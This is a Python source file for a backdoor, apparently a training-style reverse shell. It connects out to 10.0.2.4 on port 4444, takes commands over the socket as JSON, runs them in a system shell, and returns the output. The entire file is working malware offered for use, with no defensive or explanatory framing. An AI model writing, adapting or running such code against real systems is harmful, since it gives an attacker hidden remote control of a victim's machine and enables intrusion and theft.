#!usr/bin/env python3

import socket, json
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data.decode("utf-8"))
        self.connection.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "existbackdoor":
                self.connection.close()
                exit()
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)


my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()